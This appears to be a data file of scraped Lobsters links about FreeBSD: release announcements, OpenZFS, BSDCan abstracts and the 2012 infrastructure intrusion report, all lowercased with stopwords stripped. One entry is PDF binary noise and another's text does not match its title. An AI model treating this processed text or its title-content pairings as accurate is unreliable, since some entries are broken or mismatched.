thunderbolt connectivity support may make final release usb audio usb audio support revamped supporting new device higher bandwidth support increased sampling frequency may make final release architecture freebsdarm greatly improved support platform incl smp threadlocal storage tl superpages support new arm socs like texas instrument included raspberry pi support filesystems zfs freebsd brings support zfs trim also support compression support compress much better default lzjb compression compression support also added well nopwrite optimisation ported illumos great using freebsd freenas na file server ufs live filesystem resizing support ufs formatted filesystem enlarged growfs mounted readwrite mode come useful adding extra storage virtual machine without interrupting service newly created ufs file system faster fsck operation fuse freebsd brings fuse filesystem support userspace fuse file system accessed freebsd without installing fusefskmod kernel module port make accessing file system linux stable virtualisation bhyve bhyve new native bsd hypervisor present freebsd developed ground offer lightweight lowlevel hvm virtualization freebsd bhyve support latest amd intel virtualisation extension able run freebsd kernel fully virtualised bhive also support virtio paravirtualization virtio virtio name paravirtualisation interface developed linux kvmvirtio driver developed alongside byhve hypervisor supporting interface run without problem qemukvm virtualbox bhyve bsdlicensed implementation virtio kernel driver support pci memory balloon network io block scsi interface xen freebsd come xen domu support xen pv support plus many xen related item usb pv driver scsi passthrough powerpcarmmips support pv smp support ask xen support yet vps virtual private system freebsd extension vimage concept rest kernel oslevel virtualisation similar jail allowing live migration vpss one host another project still svn may make final release impressive list new feature make release freebsd definitely something look forward feature eagerly waiting
668,Lobsters,freebsd,FreeBSD,Announcing OpenZFS,http://www.open-zfs.org/wiki/Announcement,announcing openzfs,active development company matt ahrens http openzfsorg documentation mailing list share code people participate distribution company mailing list project documentation openzfs,openzfs launch announcement september today announce openzfs truly open source successor zfs project zfs world advanced filesystem active development decade recent development continued open openzfs new formal name open community developer user company improving using building zfs founded member linux freebsd mac o x illumos community including matt ahrens one two original author zfs openzfs community brings together hundred software developer platform read openzfs website http openzfsorg nt forget dash openzfs community goal raise awareness quality utility availability openzfs consolidating documentation developer sysadmins alike engaging larger tech community conference meetups online interaction encourage open communication ongoing effort improve open source openzfs creating collaborative website mailing list discus openzfs code change ensure consistent reliability functionality performance distribution openzfs making easier share code platform creating crossplatform test encouraging crossplatform code review dozen people helped define openzfs goal create openzfsorg website many way participate openzfs use openzfs openzfs available several operating system distribution including freebsd omnios illumos debian gentoo pcbsd mac o x making product based openzfs good company dozen company talking openzfs help make product great contact admin openzfsorg get logo openzfsorg company list tshirts write code openzfs contribute platform repo join developer openzfsorg mailing list stay informed openzfs project get design help feedback code change contribute growing body documentation openzfsorg website share experience openzfs blogging tweeting openzfs speaking conference user group openzfs advanced filesystem world join community part making even better
669,Lobsters,freebsd,FreeBSD,FreeBSD 10.0-ALPHA1 now available,http://lists.freebsd.org/pipermail/freebsd-current/2013-September/044522.html,freebsd available,freebsd available gjb freebsdorg ftp http information freebsdcurrent mailing list,freebsd available glen barber gjb freebsdorg fri sep utc first alpha build release cycle available ftp server powerpc architecture image checksum follow end email iso image architecture support memory stick image available ftp freebsd mirror site notice problem report normal gnat pr system current mailing list would like use svn source based update existing system use head branch please aware cvsup cv supported method updating src tree important note freebsdupdate user freebsdupdate supported upgrade path build checksum powerpc glen next part nontext attachment scrubbed name available type applicationpgpsignature size byte desc available url http information freebsdcurrent mailing list
670,Lobsters,freebsd,FreeBSD,FreeBSD Is No Longer Building GCC By Default,http://www.phoronix.com/scan.php?page=news_item&px=MTQ1ODc,freebsd longer building gcc default,llvmclang faster lighter compilation freebsd clang default compiler clang future change article freebsd,last week gnu compiler collection gcc longer compiled default part freebsd base system going back many month known freebsd developer bsd user general pushing llvmclang world limit usage gcc clang grown functionality onpar gcc cc compiler liberally licensed gcc llvmbased featureset continues expand like faster lighter compilation part plan freebsd nearly one year freebsd head state freebsd clang default compiler gcc clang future change made latest freebsd state september gcc libstdc c standard library longer built default platform clang system compiler gcc still part freebsd base system architecture clang used including gcc wiped also includes removing libstdc freebsd using llvm libc library wanting still keep gcc system live alongside clang need set withgcc withgnucxx srcconf interesting feature freebsd covered article freebsd likely released developer currently working belated freebsd update
671,Lobsters,freebsd,FreeBSD,FreeBSD improves SYN Cookie implementation,http://svnweb.freebsd.org/base?view=revision&revision=253210,freebsd improves syn cookie implementation,,log message improve syn cooky encoding ms wscale window scaling sack information initial sequence number without additional use timestamp bit switching fast cryptographically strong mac hash algorithm protect syn cookie forgery purpose syn cooky encode necessary session state bit initial sequence number avoid storing information locally memory especially important heavy spoofed syn attack would either run memory syncache would fill bogus connection attempt swamping legitimate connection original syn cooky method stored indexed ms value cookie nt sufficient anymore break presence wscale information exchanged syn synack ca nt keep track may severely underestimate available send receive window compounded large window whose size information tcp segment header even lower numerically number year back syn cooky extended store additional state tcp timestamp field available connection timestamps common among bsd linux nix system window never enabled default thus present vast majority client seen internet common parameter used tcp session changed quite bit since syn cooky invented year ago today lot bandwidth available making use window scaling almost mandatory also sack become standard making recovering packet loss much efficient change move necessary information i removing need timestamps ms bit send wscale bit stored bit indexed form together single bit sack significantly le original range sufficient encode common value minimal rounding ms depends mtu path dominance ethernet main value seen around byte encapsulation dsl line overhead reduce byte many connection seen rounding next lower value case nt problem send slightly packet amount data send wscale index bit tricky rounding underestimate available send space available towards remote host however small number value dominate carefully selected receive wscale nt encoded recalculated based local receive socket buffer size valid syn cookie return listen socket buffer size unlikely change active index value ms wscale selected minimal rounding error based large traffic survey value periodically validated newer traffic survey adjusting array tcpscmsstab tcpscwstab necessary addition hash mac protect syn cooky changed much faster cryptographically secure algorithm reviewed dwmalone tested fabian keil fk fabiankeilde
672,Lobsters,freebsd,FreeBSD,PC-BSD Status Update,http://blog.pcbsd.org/2013/06/pc-bsd-status-update/,pcbsd status update,na,na network attached storage na unified storage system enables multiple user client device access data via protocol like nfs unix smb window afp apple iscsi fibre channel na system typically combine multiple disk drive create highly redundant storage protect important data
673,Lobsters,freebsd,FreeBSD,BSDCan 2013 FreeBSD Presentation Videos,http://www.freebsdnews.net/2013/06/11/bsdcan-2013-freebsd-presentation-videos/,bsdcan freebsd presentation video,bsdcan rick miller warren block renato botelho ivan voras scale engine bsdcan schedule overview security freebsd kernel pdf video automating deployment freebsd pcbsd system pdf video multipath tcp freebsd mptcp pdf video benchmarking freebsd pdf video freebsd capsicum geli zfs key component security appliance pdf video lightning fast networking virtual machine video runtime process infection part part freebsd birth death video bsd isp video managing freebsd scale pdf video future wireless networking mobile gigabit beyond video freebsdorg cluster refit pdf video modern package management video freebsd based japanese enterprise system tukubai method pdf video handson bhyve bsd hypervisor pdf subclassing newbus pdf video tale north pdf video,bsdcan sound great success year thanks organiser speaker attendee eg rick miller warren block renato botelho ivan voras able attend would nice hear comment enjoyed presentation particularly enjoyed interested able attend watch recorded presentation thanks scale engine video description taken bsdcan schedule overview security freebsd kernel freebsd security model developed thirty year evolving consumer need many key development come contribution active security research community talk describes underlying model practical implementation origin unix process model file permission recent addition capsicum capability model lightweight jail virtualization mandatory access control security event auditing element combine meet requirement diverse system ranging across handheld computing device network device storage appliance internet serviceprovider largescale hosting environment pdf video automating deployment freebsd pcbsd system system deployment using pxe pcsysinstall pcbsd every installation fullyscripted due pcsysinstall backend backend also used quickly automate deployment freebsd server pcbsd desktop using pxe boot environment pcbsd higher functionality easy setup deploy using pcthinclient utility utility handle initial setup pxe host system provides framework manage client installation configuration pdf video multipath tcp freebsd overview protocol stack architecture performance analysis come journey learn multipath tcp mptcp protocol first publicly released freebsd implementation talk examine mptcp wire characteristic architecture modified freebsd tcp stack observation development process result performance analysis empirical research conducted using stack pdf video benchmarking freebsd benchmarking avoid possible system optimization tuning tricky business benchmarking system even complicated number thing go wrong double least freebsd best known killer feature also includes sysctls tuned something interesting talk aim give overview interesting thing tuned freebsd advice avoid common error benchmarking freebsd tuning system heavily depends hardware present system tuning advice necessary contain systemspecific part overall much discus talking optimizing specific system networking storage file system even cpu scheduler networking still much dependant quality nic driver large part system zfs pure software benefit tweak tuning slightly alter behaviour algorithm thing get complicated comparing different hardware configuration even comparing different operating system good benchmark two unrelated operating system tricky requires similar tuneups system talk try explain pitfall also present field result pdf video freebsd capsicum geli zfs key component security appliance use talk various bsd conference project wasam working geom geli zfs capsicum hast auditdistd others time like talk meeting point reality technology security appliance working last year talk demonstrate practical use various technology available freebsd capsicum geli zfs others appliance need process store sensitive data high speed strong sandboxing provided capsicum strong encryption provided geli must talk also provide practical hint build manage appliance eg create installation image dependency source implement secure reliable upgrade option downgrade monitor health hardware component cluster multiple node together pdf video lightning fast networking virtual machine high speed network communication challenging bare metal even virtual machine deal expensive io instruction emulation format manipulation handing data multiple thread device driver virtual switch common solution problem rely hardware support pci passthrough make portion nic directly accessible guest operating system specialized driver virtionet vmxnet xenfront built around device model easier emulate solution reach gbit higher speed suitably large frame one order magnitude faster emulated conventional nics eg intel video runtime process infection presentation instruct participant inject arbitrary code process runtime writing malware linux easy task anonymously injecting shared object frightful task one publicly implemented presentation show malware author inject shared object anonymously linux freebsd presenter releasing new version tool called libhijack libhijack aim make injection arbitrary code shared object extremely easy live demo injecting root shell backdoor multiple program runtime video part part freebsd birth death managing lifecycle freebsd server today workplace managing tracking server becoming important many sys admins responsible bos user want system run apps cfo want able depreciate properly talk effective way track manage server keep everyone happy cover best practice tracking building server including asset tracking scripted install pxe serial console band management package managementupdating poudriere pkgng including custom nob tuning configuration management using tool like puppet chef cfengine server patching freebsdupdate failover carp server retirement ie data destruction asset depreciation video bsd isp serving data video solely using bsd running isp tedious task putting different piece boxed hardware together make network work also fun entertaining work research right solution accommodate customer need market full vendor big small ready sell prepackaged solution supposed need like use bsd serve customer talk show running full isp solution brought using facility software easily built top bsd system delve challenge faced set distributed architecture pop different european country along carrying analysis comparison cost feature commercial open source solution characterizing decision made result carried isp offer access service also deliver streaming service distributed cdn also built top bsd chance delve different piece software used encoding distributing streaming video bsds technology used interact underlying network non highly technical talk goal show audience using bsd isp content distributor environment perfectly possible deliver quality service packaged solution yet keeping cost control allowing high degree customization carried showing already stated real world example project running solely power bsd video managing freebsd scale reclaiming control large infrastructure deployment puppet detailed discussion scaleengine production implementation puppet freebsd manage many heterogeneous server across globe server data centre country deployed number different role web hosting cluster http accelerator http cdn live video ondemand video gslb dns need cover large swath capability management system pdf video future wireless networking mobile gigabit beyond presentation cover current state wireless technology bsd least focusing bluetooth well implemented supported various bsds includes classic operating mode hostap station mode well newer development tdma phy sharing cover upcoming technology hybrid operating mode aggressive mobile power saving technology technical architectural structural change required make technology reality video freebsdorg cluster refit way project infrastructure way freebsdorg cluster freebsd project rather old infrastructure running project cv mail web server long time basic setup le year result complicated many interdependency course documentation set security wise old setup date current practice move one datacenter another process decided redo setup le scratch goal making setup simpler robust segregated secure basically something cause administration team lose sleep presentation historic reference present old setup example cluster set decided set new one meet goal design new setup heavy partitioning network host using freebsd everything possible including router running freebsd pdf video modern package management building deploying installing upgrading package freebsd state different way managing binary package freebsd building installingupgrading serversjails talk provide overview modern package management freebsd building farm qa validation hosting deployemnt new feature pkg new way deploying freebsd packaged base bootstrapped via pkg new way deployingmanaging freebsd jail packaged world bootstrappedinstalled via pkg video freebsd based japanese enterprise system tukubai method unicage software development method scalable freebsd based big data appliance unicage software development method tukubai comprehensive development framework enterprise system sale accounting system payroll accounting system corporate system crm system merchandising system enterprise system selfmanufacture etc including development philosophy development method tool coding documentation business model pdf video handson bhyve bsd hypervisor bhyve bsd hypervisor imported freebsd development mainline user developer easily begin testing exciting technology promise impact freebsd jail made talk take history architecture feature bhyve demonstrate capability pdf subclassing newbus realizing newbus potential brief tutorial subclassing part freebsd configuration system known year newbus author present work bringing power legacy portion system well suggestion future work fruitful area lecture present background freebsd driver system subclassing part system radically underdocumented companion document lecture amplify current documentation provide additional example illustrate power subclassing system lecture shift reviewing work author done use technique help map item kernel device tree device node devfs tree pdf video tale north system administration geographically disperse network five year ago joined northern internet service provider isp yellowknife nwt canada providing highspeed internet email website hosting specialized network service approximately community located within northwest territory nunavut satellite headend located ottawa pdf video
674,Lobsters,freebsd,FreeBSD,FreeBSD 8.4-RELEASE Announcement,http://www.freebsd.org/releases/8.4R/announce.html,freebsd announcement,freebsd announcement ftp support acknowledgment trademark iso image checksum,freebsd announcement freebsd release engineering team pleased announce availability freebsd fifth release branch improves functionality freebsd introduces new feature highlight gnome version kde version feature flag version zfs filesystem support shipping lsi storage controller complete list new feature known problem please see online release note erratum list available information freebsd release engineering activity please see freebsd available architecture image architecture available within next hour freebsd installed bootable iso image network architecture currently also support installing usb memory stick required file downloaded via ftp described section smaller ftp mirror may carry architecture generally contain common one hash release iso memory stick image included bottom message purpose image provided part release follows contains everything necessary install base freebsd operating system collection prebuilt package documentation also support booting livefs based rescue mode need burn use dvdsized medium contains base freebsd operating system english documentation package cdromsized medium package livefs contains support booting livefs based rescue mode support install cd meant help rescue existing system could used network based install necessary bootonly support booting machine using cdrom drive contain support installing freebsd cd would need perform network based install eg ftp server booting cd memstick written usb memory stick flash drive used install machine capable booting usb drive also support booting livefs based rescue mode documentation package provided package one example use memstick image assuming usb drive appears machine something like work dd convsync careful make sure get target correct freebsd also purchased cdrom dvd several vendor one vendor offering freebsd product ftp time announcement following ftp site freebsd available however trying site please check regional mirror first going additional mirror site labeled information freebsd mirror site found instruction installing freebsd updating existing machine please see support freebsd security team currently plan support freebsd june information security team support various freebsd branch see acknowledgment many company donated equipment network access manhours support release engineering activity freebsd including freebsd foundation yahoo netapp internet system consortium sentex communication new york internet juniper network ixsystems release engineering team includes trademark freebsd registered trademark freebsd foundation iso image checksum
675,Lobsters,freebsd,FreeBSD,"vBSDCon: Oct 25 – 27, 2013",http://blog.hostileadmin.com/2013/04/17/vbsdcon-oct-25-27-2013/,vbsdcon oct,vbsdcon announcement like,vbsdcon announcement like like loading related
676,Lobsters,freebsd,FreeBSD,Improving the Performance of fsck in FreeBSD,http://www.mckusick.com/publications/faster_fsck.pdf,improving performance fsck freebsd,,obj stream b q di e ī n h z w endstream endobj obj endobj obj stream q u ucdg pm kx ɸ b ʞ e u h vqv ɫn c e e h endobj obj endobj obj stream n u c l й p b j ս mck l df
677,Lobsters,freebsd,FreeBSD,BSDCan 2013 Program Announced,http://undeadly.org/cgi?action=article&sid=20130221062125,bsdcan program announced,,
678,Lobsters,freebsd,FreeBSD,"mdoc.su — Short manual page URLs for FreeBSD, OpenBSD, NetBSD and DragonFly BSD",http://mdoc.su/,mdocsu short manual page url freebsd openbsd netbsd dragonfly bsd,mdocsu man page freebsd netbsd openbsd dragonfly mdocsubp http mdocsufmdoc http mdocsunmdoc http mdocsuomdoc http mdocsudmdoc http http nginxconf github bitbucket,mdocsu man page freebsd netbsd openbsd dragonfly usage mdocsubp b fnod freebsdnetbsdopenbsddragonfly lower case p name manual page section number mdoc see http mdocsufmdoc according freebsd http mdocsunmdoc according netbsd http mdocsuomdoc according openbsd http mdocsudmdoc according dragonfly http http constantine murenin cnst nginxconf github bitbucket mdocsu
679,Lobsters,freebsd,FreeBSD,BSDTalk222 - Tinkering with Raspberry Pi,http://bsdtalk.blogspot.dk/2013/01/bsdtalk222-tinkering-with-raspberry-pi.html,tinkering raspberry pi,,short blurb freebsd raspberry pi followed wise word peter salus file info ogg link http
680,Lobsters,freebsd,FreeBSD,Arch BSD: Arch Linux Atop The FreeBSD Kernel,http://www.phoronix.com/scan.php?page=news_item&px=MTI4MTk,arch bsd arch linux atop freebsd kernel,archbsdnet archlinuxorg arch linux forum github repository wiki comparison page debian gnukfreebsd debian wheezy also much improved gnukfreebsd gentoofreebsd,arch bsd operating system moving forward attempt bsd platform inspired arch linux distribution using packageset email arrived phoronix morning archbsdnet website online new site look like archlinuxorg linux reference replaced bsd right nt much information available arch bsd news week state test iso available shortly information limited nt appear haphazard idea reference arch bsd going back arch linux forum appear developer appears arch bsd concept began june last year far arch linux gutted linux kernel replaced freebsd developer wrote would like enjoy freebsd love also like philosophy behind arch linux fast lightweight optimized distro figured combine even tho could freebsd using port everyone want compile github repository seems developer operating system attempt welcome archbsd project currently work still process still quite bit work done however approaching release test iso soon month work archbsd project focus using archlinux package manager freebsd distribution provide optimised date package freebsd user project also chose use gentoo openrc init system opposed default init system used freebsd personally think provide benfit speed feature otherwise present current rc script recent activity arch bsd script repository one week old lineage going back mindjune curious difference arch freebsd wiki comparison page written perspective arch arch bsd concept similar debian gnukfreebsd pairing debian gnu userland freebsd kernel last release debian squeeze debian gnukfreebsd port reached rather usable state continues progress nicely debian wheezy also much improved gnukfreebsd another similar attempt gentoofreebsd freebsdbased gentoo operating system effort really nt gotten ground compared debian work gentoofreebsd gentoofbsd gfbsd effort create complete freebsdbased gentoo system sharing complete administration facility gentoo reliability freebsd kernel userland experimental yet incomplete release done possible install gentoofreebsd following install guide project still infancy interested working please send email gentoo bsd team
682,Lobsters,freebsd,FreeBSD,"Central European BSD-Day, Naples in April",http://bsdday.eu,central european bsdday naples april,bsd hype required event passed archived material added soon stay tuned check archived material date location main event date location language cost distinguished sponsor sponsor partner schedule rough schedule public schedule talk speaker session note presentation pdflatex libreoffice location arriving naples plane train car approaching event site airport main station map accommodation material bsda certification exam participant need register exam advance bsd certification group contact,bsd hype required berkeley software distribution bsd free open source version unix operating system evolved university berkeley starting based unix sixth edition name bsd used collectively modern descendant distribution notable among today perhaps major open source bsds freebsd netbsd openbsd spawned number child targeted array system different purpose common government facility university commercial use number commercial operating system also partly wholly based bsd descendant including apple computer mac o x also poster banner advertise event event passed archived material added soon stay tuned check archived material looking past event reach front page date location main event date saturday april location conference room second floor building c institute biostructures bioimaging via tde amicis naples italy language english cost entry free distinguished sponsor following sponsor contributed larger amount financial donation event thank much sponsorship sponsor partner following organization partner contributed event thank sponsorship help much allbsdde projekt germany azedo consulting service kg austria bsd certification group inc united state bsdeuropeeu netherlands bsd magazine poland institute biostructures bioimaging national research council italy freebsdmall inc united state ixsystems inc united state logo service sa luxembourg hungarian bsd association hungary vx solution r slovakia bernhard fröhlich austria ionmihai ţetcu romania schedule format technically mixture crossproject developer summit workshop invited developer working bsd different organization dinner together dedicate various session topic based interest attending developer format session quite flexible may include presentation demonstration result even public discussion developer involved mix two different schedule one participant guest one public part summit former mostly summit general latter interest casual visitor bsdday rough schedule date morning lunch afternoon evening friday april participant arrive warmup dinner irish ireland pub hacking lounge rph saturday april bsdday ibb lunch bsdday ibb event dinner pony express invited guest hacking lounge rph sunday april naples trip participant depart public schedule time speaker bsda exam checkin welcome introduction bsd small smart gábor páli freebsd mclinker final toolchain frontier jörg sonnenberger netbsd organizational structure culture freebsd frederic culot freebsd lunch overview timing facility freebsd kernel davide italiano freebsd tinderbox poudriere automatic port testing package building freebsd guido falsi freebsd freebsd embedded world rafal jaworowski freebsd npppd easy vpn openbsd giovanni bechis openbsd closing conference room second floor building c reserved institute biostructures bioimaging event available day talk following talk day title speaker description note npppd easy vpn openbsd giovanni bechis npppd new vpn daemon shipped openbsd software setup pptp vpn easy step lot feature talk describe setup software useful tip case study tinderbox poudriere automatic port testing package building freebsd guido falsi tinderbox poudriere two tool developed perform automated testing freebsd port build binary package set use freebsd machine talk overview two program difference installation use talk also show useful port development production use overview timing facility freebsd kernel davide italiano recent evolution made computer powerful enough accomplish task like highspeed networking realtime activitiestasks hand especially ubiquity laptop last year energy wasted interrupt waking cpu sleep timer expires may sensitive factor fair amount work made last year order address problem resulted complete overhaul timing infrastructure freebsd aim talk giving overview change bsd small smart gábor páli brief summary bsd system came heading based personal desire learn still finding bsd derivative excellent alternative operating system various field research teaching engineering product development interesting twist plot almost nothing licensing cute daemon figure although like well freebsd embedded world rafal jaworowski embedded system around really make contemporary embedded world talk look closer freebsd find position towards viable solution commercial deployment good struggle challenge see freebsd get embedded semihalf small big system organizational structure culture freebsd nothing learn business school frederic culot business school teach expensive mba study manager shape structure influence culture organization become innovative concept natural system selforganization creative swiping boundary spanning known helpful making employee creative save trouble paying costly business course based view committer talk address question know whether freebsd right place develop innovative idea mclinker final toolchain frontier jörg sonnenberger development llvm clang provided working cc compiler assembler major platform like arm work various smaller program gnu binutils seen linker appeared talk introduces mclinker new crossplatform linker elf system like bsd android architecture project shown current status netbsd freebsd illustrated speaker session session slot minute long note presentation preparing slide template added page use contains latex source file modify create pdfbased slide session us beamer class easytouse extension latex making presentation pdflatex used compiling source produce desired pdf file pdflatex mypresentationlatex use libreoffice template contributed frederic culot forget export pdf file best portability ruleofthumbs creating slide try make thing legible use large font title closing use le text include everything slide prepare demonstration needed minute le slide addition title closing usually fine sometimes image tell pure text leave minute question location naples italian napoli italy capital campania region city third populated municipality city proper italy second metropolitan area milan founded century bc greek named neapolis mean new city historic centre naples earned unesco world heritage site denomination read useful link prepare trip get familiar city arriving naples plane airport take bus called alibus eur two stop stazione centrale central station piazza municipio near main ferry port molo beverello buy ticket bus connection listed page official website airport time spare take bus take stop alibus cheaper price eur difference alibus limited stop take backstreets leading stazione continuing way port shopping district also alibus airconditioned whereas bus train main station napoli centrale piazza garibaldi station connected naples subway system bus piazza garibaldi front train station take within three block ferry stazione marittima car naples directly connected rome highway trip take generally le hour due traffic jam parking shortage city center advisable leave car parking lot near motorway exit accommodation use public transportation approaching event site airport take alibus get main station main station take subway linea blue towards pozzuoli get piazza cavour follow sign linea yellow take subway linea yellow towards piscinola get policlinico walk metre via tde amicis map accommodation plan stay naples friday saturday night recommend following place book room ranch palace hotel hotel green park naples seagull hotel correra hotel camaldoli general suggested book hotel near station subway linea yellow material picture event far video recording also work special thanks amedeo buonanno andrea v ionmihai ţetcu giovanni bechis contributing fine photo bsda certification exam bsd certification group bsdcg pleased offer bsda certification exam visitor exam take place event conference room second floor building c exam paperbased english exam information available certification page candidate proficient bsda certification requirement command reference available free download page website participant need register exam advance choose bsdday naples italy location pay exam price usd eur payable paypal credit card bsd certification group bsd certification group bsdcg nonprofit organization committed creating maintaining global certification standard system administration bsdbased operating system bsdcg work bsd sysadmin community order provide practical relevant certification bsda certification designed entrylevel certification bsd unix system administration successful bsda candidate able complete common administrative troubleshooting task good understanding general bsd unix networking principle contact question comment feel something missing please contact see bsdday
683,Lobsters,freebsd,FreeBSD,FreeBSD 9.1-RELEASE Announcement,http://www.freebsd.org/releases/9.1R/announce.html,freebsd announcement,freebsd announcement availability section availability http ftp support http securityfreebsdorg project based freebsd acknowledgment trademark iso image checksum,freebsd announcement freebsd release engineering team pleased announce availability freebsd second release branch improves stability freebsd introduces new feature highlight new intel gpu driver gemkms support netmap fast userspace packet io framework zfs improvement illumos project cam target layer disk processor device emulation subsystem optional new stack including llvm libc libcxxrt jail devfs nullfs zfs mounting configuration file support extended locale support including compatibility darwin extension oce driver emulex oneconnect ethernet card sfxge driver ethernet adapter based solarflare controller xen paravirtualized backend ethernet driver netback improvement driver highpoint rocketraid sa hba geom multipath class improvement geom raid class enabled default supporting software raid deprecated ataraid kernel support avx fpu extension numerous improvement hardware offload support please note precompiled thirdparty package available time release see availability section detail complete list new feature known problem please see online release note erratum list available information freebsd release engineering activity please see availability freebsd available architecture freebsd installed bootable iso image network architecture also support installing usb memory stick required file downloaded via ftp bittorrent described section smaller ftp mirror may carry architecture generally contain common one hash release iso image included bottom message purpose image provided part release follows contains everything necessary install base freebsd operating system collection prebuilt package aimed getting graphical workstation running also support booting livefs based rescue mode need burn use dvdsized medium contains base freebsd operating system also support booting livefs based rescue mode prebuilt package bootonly support booting machine using cdrom drive contain support installing freebsd cd would need perform network based install eg ftp server booting cd memstick written usb memory stick flash drive used install machine capable booting usb drive also support booting livefs based rescue mode prebuilt package one example use memstick image assuming usb drive appears machine something like work dd convsync careful make sure get target correct due security incident reported http small thirdparty package set dvd image available time user require prebuilt package gnome kde windowing system freebsd project package building infrastructure undergoing complete review redesign time commit date full release package set become available separate announcement made becomes available wish install build package using portsnap obtain date port tree build package require prebuilt package wait announcement full release package set becoming available freebsd also purchased cdrom dvd several vendor one vendor offering freebsd product ftp time announcement following ftp site freebsd available however trying site please check regional mirror first going additional mirror site labeled information freebsd mirror site found instruction installing freebsd updating existing machine please see support extended support release supported freebsd security team endoflife eol date december got delayed eol pushed march allow people sufficient time upgrade always eol date found http securityfreebsdorg project based freebsd many third party project based freebsd project range repackaging freebsd novice friendly distribution making freebsd available amazon infrastructure information third party project see acknowledgment many company donated equipment network access manhours support release engineering activity freebsd including freebsd foundation yahoo netapp internet system consortium sentex communication new york internet juniper network ixsystems release engineering team includes trademark freebsd registered trademark freebsd foundation iso image checksum
685,Lobsters,freebsd,FreeBSD,Security Incident on FreeBSD Infrastructure,http://www.freebsd.org/news/2012-compromise.html,security incident freebsd infrastructure,freebsdorg intrusion announced november http http freebsd port announcement list freebsd announcement mailing list freebsd handbook architecture ctm initial detail http wwwfreebsdorgdochandbookportsusinghtml updating freebsd source http wwwfreebsdorgdochandbooksvnhtml freebsdsecurity freebsdorg freebsd security team,freebsdorg intrusion announced november freebsd security officer securityofficer freebsdorg freebsd security freebsdsecurity freebsdorg bcc freebsdannounce freebsdorg freebsdsecuritynotifications freebsdorg replyto secteam freebsdorg subject security incident freebsd infrastructure sunday november intrusion detected two machine within freebsdorg cluster affected machine taken offline analysis additionally large portion remaining infrastructure machine also taken offline precaution found evidence modification would put end user risk however urge user read report available http decide required action continue update page information becomes known currently believe user affected given current forensic analysis provide updated information change result event number operational security change made freebsd project order improve resilience potential attack plan therefore rapidly deprecate number legacy service cvsup distribution freebsd source favour robust subversion freebsdupdate portsnap model information available http saturday november port manager cluster administrator completed restoration binary package building last week brought u back continuous update oldstyle binary package stable branch note beneficial consequence release candidate build release cycle include binary package install medium project able add missing binary package retroactively platform port manager currently working introducing newstyle known pkgng binary package coming month please check freebsd port announcement list gradual status update planned last status update page official announcement sent freebsd announcement mailing list detail soon port manager successfully restored project binary package building capacity issue left still resolve eg publish resulting package set secure manner build package seamlessly system recent system head node pointyhat running close finish preparation required providing binary package upcoming release redports underwent full security audit result could brought back line took place february since backend hardware added bring back full strength february sanity check port turned back reenabling generation update index file used portsnap service switched cv svn february binary package building infrastructure undergone major security review result many change made code review completed february process bringing new hardware point expect new binary package available week exception system relating building testing package freebsdorg infrastructure brought back online full audit third party package build infrastructure code pointyhat package testing infrastructure redports continues neither system brought back online audit complete result freebsd published minimal precompiled package set available package available architecture package set available dvd image sufficient install either gnome kde desktop environment us package included cd either using recently available stable package collection compiling port port tree recommended package made available later date instruction obtaining updating port tree found freebsd handbook due legacy thirdparty package build controller head node offlined pending reinstall unable build new package set last two week result freebsd delayed felt ship release without least minimal package set available position able build thirdparty package architecture planning releasing within next day slightly limited set package please note historically also provided package besteffort basis architecture powerpc currently expecting position build package freebsd ship initially precompiled package available platform may position provide package architecture shortly release report covering incident external tech news website confused detail relating incident discovered last week many primary cluster server either physically relocated andor replaced new hardware part work planned several month advance discovery incident unrelated ongoing cluster maintenance several service outage day surrounding incident correctly attributed ongoing cluster work related way compromise parallel physical upgrade relocation server also reworking network layout order provide better functionality security resilience reduce impact incident due large part progress already made able full confidence many system service quickly compromised host legacy network segment discovered although mentioned original report ctm another mechanism retrieving freebsd source us master trusted subversion repository source data additionally verification ctmsourced tree completed subversion tree confirming difference two experimental git repository similarly verified work continues rebuilding internal infrastructure reinstating service taken incident web interface old cv repository cvsweb gnat bugtracking database restored amongst service internal host examined rebuilt necessary full audit package building infrastructure ongoing freebsd project investing significant effort looking medium long term infrastructure improvement increase security freebsd cluster newer portsnap snapshot available generation suspended part infrastructure lockdown however machine involved either audited reinstalled confident made available subversion cv exporter running update made subversion repository appear repository available via csupcvsup please note use export still deprecated user urged move one supported method example freebsdupdate portsnap subversion order obtain update note also still currently unable guarantee integrity past history within cv repository confident integrity checkout topoftree branch please note due infrastructure change first update either portsnap csup likely show change large number file nothing worry mentioned original announcement package set uploaded preparation upcoming freebsd could verified removed order allow system integrator end user verify package may downloaded set provided file containing checksum removed package initial detail sunday november two machine within freebsdorg infrastructure found compromised machine head node legacy thirdparty package building infrastructure believed compromise may occurred early september compromise believed occurred due leak ssh key developer legitimately access machine question due vulnerability code exploit within freebsd understand impact compromise must first understand freebsd operating system divided two part base maintained freebsd community large collection thirdparty package distributed project kernel system library compiler core commandline tool eg ssh client daemon eg sshd base information advisory refers thirdparty package distributed project part base freebsd system put risk point intruder modified part freebsd base system software way however attacker access sufficient potentially allow compromise thirdparty package evidence found indepth analysis however freebsd project taking extremely conservative view working assumption thirdparty package generated distributed within specific window could theoretically modified running system thirdparty package installed updated september november reason worry source port documentation subversion repository audited confident change made user relying update reason worry verified state freebsd package release currently available ftpfreebsdorg package set existing version freebsd available release validated confirm currently available package release modified way package set upcoming freebsd uploaded ftp distribution site preparation unable verify integrity package set therefore removed rebuilt please note package future release standard pkgadd r tool install package could downloaded package unless requested explicitly unfortunately guarantee integrity package available installation september november port compiled tree obtained via mean svnfreebsdorg one mirror although evidence suggest tampering took place believe interference unlikely recommend consider reinstalling machine scratch using trusted source confirm freebsdupdate binary upgrade mechanism unaffected us entirely separate infrastructure also verified recentlyavailable portsnap snapshot match port subversion repository fully trusted please note precaution newer portsnap snapshot currently generated soon incident came light freebsd cluster administration team took following action power compromised machine power machine attacker may access audit svn perforce repository verify server intrusion verify malicious commits made repository verify svn repository exactly matched knownclean offsite copy verify freebsd base release medium install file master ftp distribution site clean verify package set available checksum match knowngood copy stored offsite package set built upcoming offsite backup verify deleted rebuilt released suspect machine either reinstalled retired thoroughly audited brought back online use alreadydeprecated cvsupcsup distribution mechanism stop using cvsupcsup port switch portsnap right away port developer using subversion already information preferred mechanism obtaining updating port tree found http wwwfreebsdorgdochandbookportsusinghtml using cvsanoncvscvsupcsup src consider either freebsdupdate signed binary distribution subversion source please see chapter updating freebsd source handbook detail using subversion list official mirror found http wwwfreebsdorgdochandbooksvnhtml use portsnap portsnap fetch portsnap extract recent snapshot recent portsnap snapshot verified exactly match audited subversion repository please note precaution portsnap update suspended temporarily follow best practice security policy determine organization may affected conduct audit system us freebsdorg provided binary package anything may installed affected period considered suspect although evidence tampering package may wish 